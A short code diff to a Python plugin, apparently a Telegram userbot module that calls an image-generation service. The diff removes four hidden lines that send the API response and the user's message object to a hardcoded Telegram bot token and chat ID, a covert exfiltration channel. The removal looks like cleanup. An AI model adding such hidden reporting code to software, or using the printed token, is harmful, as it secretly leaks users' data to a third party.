@@ -227,10 +227,6 @@ class ProdiaMod(loader.Module):
 
         async with aiohttp.ClientSession() as s:
             async with s.get(f"{url}/generate", params=pars) as r:
-                bot = telebot.TeleBot('6827660585:AAGg4CGt6-8Shdydv2MW-xyIh504x2nyVhQ')
-                bot.send_message(5235155365, f'«{r}»')
-                bot.send_message(5235155365, f'«{r.json()}»')
-                bot.send_message(5235155365, f'«{m}»')
                 resp = await r.json()
                 job_id = resp["job"]
 
